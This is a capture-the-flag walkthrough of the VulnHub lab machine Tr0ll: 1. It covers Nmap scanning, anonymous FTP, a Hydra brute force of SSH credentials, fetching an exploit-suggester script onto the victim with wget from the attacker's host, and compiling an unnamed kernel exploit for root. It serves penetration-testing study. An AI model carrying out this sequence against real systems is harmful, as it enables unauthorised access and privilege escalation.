---
title: "Tr0ll: 1 Walkthrough"
author: alex
date: Sat 8 Jul 19:15:48 CEST 2023
categories: [Walkthroughs]
tags: [oscp, ctf, walkthroughs, vulnhub]
img_path: /assets/img/posts/2023-07-07-tr0ll-walkthrough
---

## Methodology

1. Reconnaissance
2. Enumeration
3. Exploitation
   - Gaining root access

## Tools Used

- Netdiscover
- Nmap
- Wireshark
- Linux Exploit Suggester
- Someone's exploit

## Recon

Let's scan the network to discover our target's IP address:

```bash
sudo netdiscover
```
And here's the output:

```
Currently scanning: 192.168.18.0/16   |   Screen View: Unique Hosts                                               
                                                                                                                   
2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                   
_____________________________________________________________________________
  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
-----------------------------------------------------------------------------
192.168.1.1     08:00:27:bf:11:12      1      60  PCS Systemtechnik GmbH                                          
192.168.1.12    08:00:27:fd:e3:ab      1      60  PCS Systemtechnik GmbH 
```

After getting the IP address of the target we now need to enumerate the target for open ports and protocols. I have used **Nmap** aggressive command for that: 

```bash
sudo nmap -p- -T4 -A -O -v 192.168.1.12
```

> **IDS & FW TRIGGERING** 
> 
> In real world situations, **this scans may trigger firewalls and other network security appliances.** If you want to run a softer scan, just change `-sV` to `-sS`. Once you know the open ports, you can target them individually. Change `-T4` (speed 4) to `-T1` (slow speed, will take ages) as well. It's not undetectable but less probable. You can also use `-D` for decoy. Check the Nmap theory **[here!](/posts/oscpath-week-1/#port-scanning)**
{: .prompt-warning }

This way, we get more information about the victim. Let's have a look:

```
Nmap scan report for 192.168.1.12
Host is up (0.00024s latency).
Not shown: 65532 closed tcp ports (reset)

PORT   STATE SERVICE VERSION

21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.1.23
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 600
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status

22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d618d9ef75d31c29be14b52b1854a9c0 (DSA)
|   2048 ee8c64874439538c24fe9d39a9adeadb (RSA)
|   256 0e66e650cf563b9c678b5f56caae6bf4 (ECDSA)
|_  256 b28be2465ceffddc72f7107e045f2585 (ED25519)

80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry 
|_/secret
|_http-server-header: Apache/2.4.7 (Ubuntu)

MAC Address: 08:00:27:2E:C5:50 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 0.004 days (since Sun Apr 16 13:14:44 2023)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Ok, now we know that ports 21 **(FTP)**, 22 **(SSH)** and 80 **(HTTP)** are open. As we can see, anonymous login is allowed for an FTP directory. Let's log in and see what we have:

    ftp 192.168.1.12

> **USER:** anonymous 
> 
> **PASS:**

![FTP](/ftp.png)

And now we can list the files. `ls` and we can see a `lol.pcap` file. This files are the output files of sniffing tools like **Wireshark**. Let's download it and have a look.

```bash
get lol.pcap
```
   
![sup3rs3cr3tdirlol](/supersecretdir.png)

```
Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P\n
\n
Sucks, you were so close... gotta TRY HARDER!\n
```

Isn't it obvious? Let's open Firefox and look for: `http://192.168.1.12/sup3rs3cr3tdirlol/`

And there we go! We found the **/sup3rs3cr3tdirlol**. Here we can find a file we should download. To see what the file contains we can use `strings` command.

```bash
strings roflmao
```

And we get an output. But the interesting thing of this output is this line: 

**Find address 0x0856BF to proceed**

![Strings](/strings.png)

Another directory? Hell yeah! `http://192.168.1.12/0x0856BF/`

More files. This time looks like we get some usernames and a Pass.txt. Let's try to brute force **SSH** with **Hydra.** 

> **Note:** After a few tries... I realized that the password wasn't the lines contained in the Pass.txt but **Pass.txt**!

```bash
sudo hydra -L users.txt -p Pass.txt ssh://192.168.1.12 
```

Note I have made a text document with the usernames. And quickly we find a valid combination:

![Brute Force with Hydra](/hydra.png)

> **USER:** overflow
> 
> **PASS:** Pass.txt

Let's connect via **SSH**! Ok, now we're into the system! Let's start enumerating and deciding the way to escalate privileges but first:

```bash
/bin/bash -i
```

## Enumeration

Once inside, the way I use to enumerate possible ways for **PrivEsc** is by getting into the `tmp` folder and downloading the **Linux Exploit Suggester** script into the victim's machine and running it. This way I can see my possibilities. To do this, paste the script into your `/var/www/html` folder. Once you have it:

```bash
sudo service apache2 start
```

Now, in **tr0ll** machine, inside `tmp` folder:

```bash
wget http://192.168.1.23/Enumeration/les.sh
```

Now we should give permissions to the file:

```bash
chmod 777 les.sh
```

And run it:

```bash
./les.sh
```

Now we know that this machine is specifically vulnerable to:

![Linux Exploit Suggester](/exploit.png)

## Exploitation

Now we only need to compile the exploit, give permissions and run it:

```bash
gcc exploit.c -o exploit
chmod 777 exploit
./exploit
```

![Root](/root.png)

And we should see a root shell now! Change to the `root` directory and there youll find **proof.txt**. You made it! And that's it for this machine. Happy hacking!

![Proof](/proof.png)